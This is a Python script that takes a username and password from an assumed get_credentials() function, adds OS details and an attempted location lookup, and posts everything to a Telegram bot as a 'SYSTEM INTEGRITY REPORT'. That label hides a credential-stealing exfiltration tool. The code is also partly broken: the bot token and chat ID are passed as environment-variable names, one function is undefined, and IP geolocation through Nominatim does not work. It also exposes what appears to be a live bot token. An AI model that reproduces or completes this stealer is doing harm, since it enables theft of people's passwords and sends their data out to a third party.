import requests
import os
from datetime import datetime
import pytz
import platform
from geopy.geocoders import Nominatim # For Geolocation/Location Lookup

# --- Configuration ---
TELEGRAM_BOT_TOKEN = os.environ.get("8882787769:AAEwdYpkTzIe3AcGHvJTgYN0lyaw3GaDhI8")
CHAT_ID = os.environ.get("736969421")
API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

# --- 1. Data Collection Functions ---

def get_system_info():
    """Captures OS, architecture, and general system details."""
    info = {
        "OS_Platform": platform.system(),
        "OS_Release": platform.release(),
        "System_Architecture": platform.machine(),
        # Timezone handling: This tries to guess or read configured local settings
        "Timezone": "N/A (Requires manual check or specific OS library)" 
        # For precise OS timezone, you often need subprocess calls to system commands (like 'date' or 'timedatectl')
    }
    return info

def get_location_info(ip_address="N/A"):
    """Uses a geolocation service (Nominatim/OpenCage) based on IP if provided."""
    if ip_address == "N/A":
        return {"Latitude": "Unknown", "Longitude": "Unknown", "City": "Unknown"}

    try:
        # Use Nominatim to look up location data based on IP
        geolocator = Nominatim(user_agent="DIG_System_Monitor")
        location = geolocator.geocode(ip_address)

        if location:
            return {
                "Latitude": location.latitude,
                "Longitude": location.longitude,
                "City": location.address.split(',')[0] if location.address else "Unknown"
            }
        return {"Latitude": "Lookup Failed", "Longitude": "Lookup Failed", "City": "Unknown"}
    except Exception as e:
        print(f"Geolocation error: {e}")
        return {"Latitude": "Error", "Longitude": "Error", "City": "Error"}

# --- 2. Telegram Sender Function (Enhanced) ---

def send_advanced_report(credentials_data, system_data, location_data):
    """Sends all collected data packaged neatly to Telegram."""
    if not TELEGRAM_BOT_TOKEN or not CHAT_ID:
        print("Error: Telegram credentials not configured!")
        return

    # --- Comprehensive Message Formatting (Markdown highly recommended) ---
    message = (
        f"📡 **SYSTEM INTEGRITY REPORT** 📡\n"
        f"------------------------------------------\n"
        # 1. CREDENTIALS
        f"🔐 **[Credentials Found]** 🔐\n"
        f"  Username: {credentials_data.get('user_name', 'N/A')}\n"
        f"  Password: {credentials_data.get('password', 'N/A')}\n"
        f"⏰ Retrieval Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')}\n"
        f"------------------------------------------\n"
        # 2. LOCATION
        f"🗺️ **[Location Data]** 🗺️\n"
        f"  City: {location_data['City']}\n"
        f"  Coords: ({location_data['Latitude']}, {location_data['Longitude']})\n"
        f"------------------------------------------\n"
        # 3. SYSTEM INFO
        f"🖥️ **[System Details]** 🖥️\n"
        f"  OS: {system_data['OS_Platform']} {system_data['OS_Release']}\n"
        f"  Arch: {system_data['System_Architecture']}\n"
        f"  Timezone: {system_data['Timezone']}\n"
        f"------------------------------------------"
    )

    try:
        response = requests.post(
            API_URL,
            data={'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
        )
        response.raise_for_status()
        print("✅ ADVANCED REPORT SENT SUCCESSFULLY.")
    except requests.exceptions.RequestException as e:
        print(f"❌ FAILURE: Could not send advanced report to Telegram. Error: {e}")

# --- Main Execution Flow ---
if __name__ == "__main__":
    # 1. Retrieve core data
    credentials = get_credentials() # Assume this function exists

    # 2. Gather supporting data
    system_info = get_system_info()
    # You must provide the IP address your script is running from for location lookups
    ip_addr_for_lookup = "your_script_public_ip_address" 
    location_info = get_location_info(ip_addr_for_lookup)

    # 3. Report everything
    send_advanced_report(credentials, system_info, location_info)
